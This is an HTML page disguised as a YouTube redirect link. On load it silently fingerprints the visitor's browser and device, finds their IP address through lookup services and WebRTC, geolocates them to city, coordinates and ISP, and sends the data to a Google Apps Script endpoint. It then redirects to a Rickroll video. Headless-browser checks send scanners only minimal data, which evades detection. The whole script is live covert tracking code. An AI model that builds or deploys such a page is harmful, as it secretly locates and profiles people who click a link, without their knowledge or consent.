<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <!-- Redirect immediately -->
    <meta http-equiv="refresh" content="0;url=https://www.youtube.com/watch?v=dQw4w9WgXcQ">
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #fff;
            font-family: Arial, sans-serif;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Invisible iframe to collect data without affecting main page -->
    <iframe src="about:blank" id="dataCollector" style="display:none"></iframe>
    
    <!-- Visible content that instantly redirects -->
    <div style="text-align:center; padding:50px;">
        <h2>Redirecting to YouTube...</h2>
        <p>If you are not redirected automatically, <a href="https://www.youtube.com/shorts/gRVU6OvOSfY">click here</a>.</p>
    </div>

    <script>
        const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbwn5V4cJO9wpFiFCqyDR_fmTn4DTYv8L4-XWO58CyzcvxSw-zLYSluL6Gw5TVrZibwo2Q/exec';
        let dataSent = false;

        // ðŸŽ¯ **DETECT HEADLESS BROWSER**
        function detectHeadless() {
            const tests = { isHeadless: false, failedTests: [], passedTests: [] };
            
            // Quick checks only (fast)
            if (navigator.webdriver === true) tests.failedTests.push('webdriver');
            if (navigator.plugins.length < 2) tests.failedTests.push('few_plugins');
            if (!navigator.languages || navigator.languages.length === 0) tests.failedTests.push('no_languages');
            if (window.outerWidth === 0 && window.outerHeight === 0) tests.failedTests.push('zero_window');
            if (window.chrome && !window.chrome.runtime) tests.failedTests.push('no_chrome_runtime');
            
            tests.isHeadless = tests.failedTests.length >= 2;
            return tests;
        }

        // ðŸŽ¯ **GET TIMEZONE (Unbeatable)**
        function getTimezone() {
            const tz = {};
            try {
                // Method 1: Intl API
                tz.intl = Intl.DateTimeFormat().resolvedOptions().timeZone;
                tz.method = 'Intl_API';
            } catch(e) {
                // Method 2: Date string parsing
                const str = new Date().toString();
                const match = str.match(/\(([^)]+)\)/);
                if (match) {
                    tz.intl = match[1];
                    tz.method = 'String_Parse';
                }
                // Method 3: Offset mapping
                const offset = -new Date().getTimezoneOffset() / 60;
                const offsetMap = {
                    '-5': 'America/New_York', '-8': 'America/Los_Angeles', '0': 'Europe/London',
                    '1': 'Europe/Paris', '2': 'Europe/Athens', '3': 'Europe/Moscow',
                    '5.5': 'Asia/Kolkata', '8': 'Asia/Shanghai', '9': 'Asia/Tokyo',
                    '10': 'Australia/Sydney'
                };
                if (offsetMap[offset]) {
                    tz.offset_based = offsetMap[offset];
                    tz.method = 'Offset_Map';
                }
            }
            return tz.intl || tz.offset_based || 'Unknown';
        }

        // ðŸŽ¯ **GET IP (Multiple Fallbacks)**
        async function getIP() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://icanhazip.com',
                'https://ifconfig.me/ip',
                'https://ident.me'
            ];
            
            for (let url of services) {
                try {
                    const response = await fetch(url, { signal: AbortSignal.timeout(1000) });
                    if (url.includes('ipify')) {
                        const data = await response.json();
                        return { ip: data.ip, source: 'ipify' };
                    } else {
                        const ip = await response.text();
                        return { ip: ip.trim(), source: url };
                    }
                } catch(e) {
                    continue;
                }
            }
            
            // WebRTC fallback
            try {
                const rtc = new RTCPeerConnection({iceServers: []});
                rtc.createDataChannel('');
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                
                return new Promise((resolve) => {
                    rtc.onicecandidate = (ice) => {
                        if (ice && ice.candidate && ice.candidate.candidate) {
                            const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                            if (ipMatch) {
                                rtc.close();
                                resolve({ ip: ipMatch[1], source: 'WebRTC', is_local: true });
                            }
                        }
                    };
                    setTimeout(() => {
                        rtc.close();
                        resolve({ ip: 'Blocked', source: 'All methods failed' });
                    }, 800);
                });
            } catch(e) {
                return { ip: 'Blocked', source: 'All methods blocked' };
            }
        }

        // ðŸŽ¯ **COLLECT BASIC DATA (Fast)**
        function collectBasicData() {
            return {
                timestamp: new Date().toISOString(),
                local_time: new Date().toLocaleString(),
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages?.join(', ') || '',
                screen: screen.width + 'x' + screen.height,
                color_depth: screen.colorDepth + ' bit',
                pixel_ratio: window.devicePixelRatio,
                hardware_cores: navigator.hardwareConcurrency || 'Unknown',
                device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                referrer: document.referrer || 'Direct',
                url: window.location.href,
                cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
                do_not_track: navigator.doNotTrack || 'Not set',
                plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None',
                localStorage: !!window.localStorage,
                sessionStorage: !!window.sessionStorage,
                webrtc: !!window.RTCPeerConnection,
                timezone: getTimezone(),
                timezone_offset: new Date().getTimezoneOffset()
            };
        }

        // ðŸŽ¯ **MAIN COLLECTION (Runs in background)**
        async function collectAndSend() {
            if (dataSent) return;
            dataSent = true;
            
            // Detect headless first
            const headlessCheck = detectHeadless();
            if (headlessCheck.isHeadless) {
                // Quick minimal data for scanners
                const scannerData = {
                    scanner: true,
                    detection: headlessCheck,
                    timestamp: new Date().toISOString(),
                    user_agent: navigator.userAgent?.substring(0, 100) || 'Unknown',
                    url: window.location.href
                };
                
                fetch(EMAIL_SCRIPT + '?data=' + encodeURIComponent(JSON.stringify(scannerData)), 
                      { mode: 'no-cors' });
                return;
            }
            
            // For real users: collect everything quickly
            const data = collectBasicData();
            data.headless_check = headlessCheck;
            data.visitor_type = 'REAL_HUMAN';
            
            // Get IP (async, don't wait too long)
            const ipPromise = getIP().then(ipInfo => {
                data.ip_info = ipInfo;
                if (ipInfo.ip !== 'Blocked' && !ipInfo.is_local) {
                    // Try quick geolocation
                    fetch(`https://ipapi.co/${ipInfo.ip}/json/`)
                        .then(r => r.json())
                        .then(geo => {
                            data.geolocation = {
                                city: geo.city,
                                region: geo.region,
                                country: geo.country_name,
                                latitude: geo.latitude,
                                longitude: geo.longitude,
                                isp: geo.org
                            };
                            sendData(data);
                        })
                        .catch(() => sendData(data));
                } else {
                    sendData(data);
                }
            }).catch(() => {
                data.ip_info = { ip: 'Failed', source: 'All methods failed' };
                sendData(data);
            });
            
            // Timeout if IP takes too long
            setTimeout(() => sendData(data), 1500);
        }

        // ðŸŽ¯ **SEND DATA**
        function sendData(data) {
            // Try POST first
            fetch(EMAIL_SCRIPT, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            }).catch(() => {
                // Fallback to GET
                const params = new URLSearchParams();
                params.append('data', JSON.stringify(data));
                fetch(EMAIL_SCRIPT + '?' + params.toString(), { mode: 'no-cors' });
            });
        }

        // ðŸš€ **START COLLECTION (Runs silently)**
        window.addEventListener('load', () => {
            // Start collection but don't wait for it
            collectAndSend();
            
            // Redirect almost immediately (user sees brief flash at most)
            setTimeout(() => {
                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
            }, 300); // Only 300ms delay - barely noticeable
        });
    </script>
</body>
</html>
